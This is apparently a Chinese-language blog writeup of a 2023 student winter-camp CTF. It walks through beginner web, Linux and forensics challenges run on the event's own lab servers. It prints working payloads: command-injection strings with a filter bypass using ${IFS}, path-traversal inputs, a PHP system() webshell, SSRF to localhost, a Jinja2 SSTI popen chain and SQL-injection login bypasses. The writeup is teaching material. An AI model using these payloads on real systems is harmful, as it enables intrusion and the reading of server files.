---
title: 中部電資寒訓 CTF Writeup
slug: scaict-wintercamp-ctf-writeup
date: '2023-01-31T00:00:00.000Z'
draft: false
description: THJCC CTF challenge writeup.
tags:
  - ctf
  - writeups
categories:
  - Security
authors:
  - haoching
lastmod: '2026-08-11T17:58:57.200Z'
---



# 2023中興大學中部電資寒訓 CTF Writeup 搶旗大賽題目詳解 

URL : http://ctf.scaict.org



## 說明
解法不一定是最好的如果有其他解法只要拿的到 flag 就是好解法~~我在去年寒訓就有幾題是直接在github偷的~~
> 順便給一下這次我出的題目的 repo
> https://github.com/SCAICT/NCHUwintercamp_CTF
> [name=張皓晴]

## Welcome
### 歡迎來到興大寒訓CTF
 
   期望解是 `cat hi` 但用 vs code 開也行

## Web Security 課內
### free flag
有些人把驗證程式或機密資訊放在前端（使用者電腦），造成資訊洩漏。
按 F12->元素可看 HTML 內容，其中 script 標籤有放 Javascript 程式，裡面有 flag
![](https://i.imgur.com/t4QwKOG.png)

### 302 Relocation
![](https://i.imgur.com/xvzSGNJ.png)
按 "Get flag" 會自動轉址到 302 首頁，沒辦法看 "Get flag" 的 Response
按 F12->網路，再點一次 "Get flag"，右邊出現兩個欄位，302-flag 就是按 "Get flag" 回傳的 Response，回應標頭有一欄是 flag
用 curl 看 Response 也行，`-I` 表示只看 Response header，不看 HTML
```bash
curl -I http://ctf.scaict.org:8301/302-flag
```

### change cookie
題目說「只有 admin 能看 flag」，伺服器怎麼知道我們不是 admin?
![](https://i.imgur.com/Qe2xWYV.png)
打開 F12->應用程式->Cookie->ctf.scaict.org:8301 欄位，右邊可看到 Cookie username=guest，把它改成 admin 後重新整理（再送一次 Request）就有 flag
![](https://i.imgur.com/sgX8XIJ.png)

     
### Logic flaw number
擁有超過 100 元的人才能看 flag，我們有 10 元，花 10 元買飲料看看
![](https://i.imgur.com/8kLtNYR.png)
沒錢了ㄏㄏ
![](https://i.imgur.com/GsNkDRI.png)
這時我們可以猜背後的運作原理，可能長這樣：
```python
'''
amount 餘額
price 飲料價格
count 飲料數量
'''
if amount >= price * count:
    amount -= price * count
```
如果沒驗證 `number>=0`，可直接輸入負數，amount 減負數相當於加正數
因此輸入 -100 試試看，剛好可以拿到 flag
![](https://i.imgur.com/LuLuHxp.png)

> 這就是程式的邏輯漏洞
> 現實世界沒有 -1 瓶飲料
    
### Broken Role
題目只給 admin 看 flag，但改 cookie 沒用（cookie 屬於別的題目，session 無法改）。
![](https://i.imgur.com/Obsi5ke.png)
網址上方有 `role=1`，這是否有些用處？
改成 `role=admin` 沒用。
這時就要想：為何開發者寫 `role=1`？
一個思路是：1 代表使用者的 id，如果改成 0 會如何？
![](https://i.imgur.com/N1Yo9NW.png)
有些程式忘了驗證 Session，原本只有本人看到的頁面，都會被公開。
改成 0 的理由是：0 是第一個自然數，常代表 root。

### Change email
這個頁面被保護得很好，無法以 @admin.scaict.com 的 email 登入
![](https://i.imgur.com/I01pg8M.png)
沒關係，我們先當普通人，輸入 email 登入後，下面有個 setting。
點進去發現可以改帳號的 email，可能沒驗證 email 結尾，輸入 @admin.scaict.com 的 email。
![](https://i.imgur.com/cjkVpsH.png)
拿到 flag
![](https://i.imgur.com/f17PD56.png)
> 令人想到特洛伊木馬
> 本題簡化自 [Portswigger Lab: Inconsistent security controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls)

### Cmdi
他叫我們輸入 ip，我們隨便輸入 ip，或者說打 `google.com` 看看。
![](https://i.imgur.com/IO9xFj9.png)
![](https://i.imgur.com/fPpzPJs.png)

可以推測，伺服器用 `ping` 指令確定 ip 連線狀態。
輸入 `google.com` 伺服器執行 `ping google.com`。
輸入 `ctf.scaict.org` 伺服器執行 `ping ctf.scaict.org`。
而輸入 `; ls`，伺服器沒檢查，就會執行 `ping; ls`，輸出 `ls` 結果（後面 Dockerfile 等）。
![](https://i.imgur.com/eM2STmf.png)
輸入 `;cat flag.txt` 看有沒有 flag。
![](https://i.imgur.com/Qs8qFQq.png)
### Path traversal
題序說 flag 在上層目錄的 flag.txt。
![](https://i.imgur.com/sfMH0i0.png)
經過觀察並亂改 filename 參數，確定網頁以此參數找檔案，例如 002.jpeg 就找資料夾下 002.jpeg 這個檔案。
在 filename 指定「上層目錄的 flag.txt」，也就是 `../flag.txt` 就有 flag。

### File Upload
> 本題為求聚焦，不會像簡報以 GET 參數傳指令，而是把指令寫死在後門。
> 因此，用一指令就要重新修改並上傳後門。

傳個 php 程式（副檔名為 .php），此 File-based 伺服器將自動執行 php。
> 建立 php 檔案方法請自行 google
```php
<?php system('ls')?>
```
![](https://i.imgur.com/QxecdFc.png)
![](https://i.imgur.com/eWg8FNv.png)
php 成功執行 `ls`，只出現當前目錄下 exploit.php。
往上層目錄看看，發現 flag.txt。
```php
<?php system('ls ../..')?>
```
![](https://i.imgur.com/oEWuSLU.png)
查看 flag.txt 內容。
```php
<?php system('cat ../../flag.txt')?>
```

### SSRF
flag 在 ssrf_target 頁面，但我們看不到它。
ssrf 頁面有輸入 url 的地方，它幫我們訪問 url 並回傳結果，輸入 google.com 看看。
![](https://i.imgur.com/KUhW5Db.png)
此頁面也許能看內部網頁，但網址需改成 127.0.0.1（代表本機）。
輸入 `127.0.0.1:8301/ssrf_target`。
![](https://i.imgur.com/zKbVDEa.png)
它幫我們拿到內部 flag。
![](https://i.imgur.com/87Ajw3w.png)

## Web
### Cmdi Pro max
本題刪掉所有空格與分號，並檢查有沒有 `cat`, `flag.txt` 字串。
![](https://i.imgur.com/1RULdrs.png)
> 建議先上網查資料

`cat` 被禁掉還有 `head`, `more` 等指令可用。
`flag.txt` 可改成 `fla''g.txt`，或 `fla*` 表示 fla 開頭所有檔案。
空格可用 tab, `${IFS}` 代替，最後分號改成 `||`。
```bash
||head${IFS}fla''g.txt
```
> is 需改成 are，英文好爛


### 烏龜查詢系統
http://ctf.scaict.org/challenges#%E7%83%8F%E9%BE%9C%E6%9F%A5%E8%A9%A2%E7%B3%BB%E7%B5%B1-18
- 看 cookie 變化慢慢試 flag 在 17
    
> 這題是我~~抄~~致敬 picoCTF 的題目 picoCTF 把 falg 藏在18 我因為烏龜太多很想放所以也把 flag 放很後面看到蠻多人到一半就放棄了很可惜 這我的鍋
    
### never gonna give you up
    http://ctf.scaict.org/challenges#never%20gonna%20give%20you%20up-19
    
    `curl http://ctf.scaict.org:8401/`
    這題看到不少人在 youtube 上找 flag 但其實基本沒人能把 flag 藏在 yt 裡

### Advanced path traversal
題目將刪掉所有 `../`，避免訪問上層目錄。
參數改成 `filename=....//flag.txt`，中間 `../` 被刪掉剩 `filename=../flag.txt`。
![](https://i.imgur.com/ngwY9fX.png)

### SSTI
SSTI 需稍微學過 Flask 才好理解。
總之，伺服器用 Python 執行 `{{}}` 內的字串（只有一行），顯示在網頁，以下 payload 能執行 `ls` 並回傳結果。
```python
{{().__class__.__base__.__subclasses__()[140].__init__.__globals__["popen"]('ls').read()}}
```
改成 `cat flag.txt` 就有 flag。
```python
{{().__class__.__base__.__subclasses__()[140].__init__.__globals__["popen"]('cat flag.txt').read()}}
```

靶機程式：
```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if 'name' in request.form:
        print('<h1>Hello '+request.form['name'] + '</h1>')
        return render_template_string('<h1>Hello '+request.form['name'] + '</h1>')
    return render_template('index.html')
```
 
### むむむむむむ
http://ctf.scaict.org/challenges#%E3%82%80%E3%82%80%E3%82%80%E3%82%80%E3%82%80%E3%82%80-21
- 下面的那些文字其實是一種名為COW的冷門程式語言丟到 https://tio.run/#cow 執行
    ![](https://i.imgur.com/AY84mki.png)
    
- 這題其實是因為本來有團康活動有講到 cow 這語言如果在這題被卡很久就抱歉啦

### 很有趣的 CTF
http://ctf.scaict.org/challenges#%E5%BE%88%E6%9C%89%E8%B6%A3%E7%9A%84%20CTF-22
- 第二個慢慢點開或直接下載或按遞迴展開
    ![](https://i.imgur.com/8K9fUMx.png)

    很有趣吧
    
### 水題
    http://ctf.scaict.org/challenges#%E6%B0%B4%E9%A1%8C-23
    刪掉前面的圖或找 css 或到來源看會有背景圖片點進去
 ![](https://i.imgur.com/OHr6Yrc.jpg)
 
## Linux 基礎
### please find me !
 
   用文字編輯器開 ctrl + f `nchu` or grep `nchu`

### 別再cd了

    grep or ctrl+f or unzip 輸出的那串 cat 出來

## Kali
### 隱藏檔案
    使用binwalk加上-e參數把隱藏的zip檔案解壓縮出來 進去隱藏資料夾後會發現資料夾最底層還有一張圖片 再使用binwalk分析一次 會發現又出現了隱藏資料夾 一直分析隱藏資料夾裡面的文件直到出現flag.txt
    

## OTHER
### 字音字形

字音字形自己去查教育部辭典簡編本(那些都是工作人員的名子)

### SQL Injection
- http://ctf.scaict.org:8200/
> 解法1 :
    因知道資料庫內有位使用者叫"admin"，所以我們直接在帳號欄輸入admin，後面加個單引號和括號結束這段字串，後面的' --'是資料庫註解語法(後面的東西資料庫都不會讀取)
    密碼區隨便打
    ![](https://i.imgur.com/dWg66Zf.png)
<br>
    解法2 :
    在不知道資料庫有哪筆使用者資料的情況下，在後面新增恆正的條件式，這樣一來即使前面輸入的帳號是錯誤的還是會被視為正確執行，後面的' --'是資料庫註解語法(後面的東西資料庫都不會讀取)
    密碼區隨便打
    ![](https://i.imgur.com/yp0I0Qu.png)
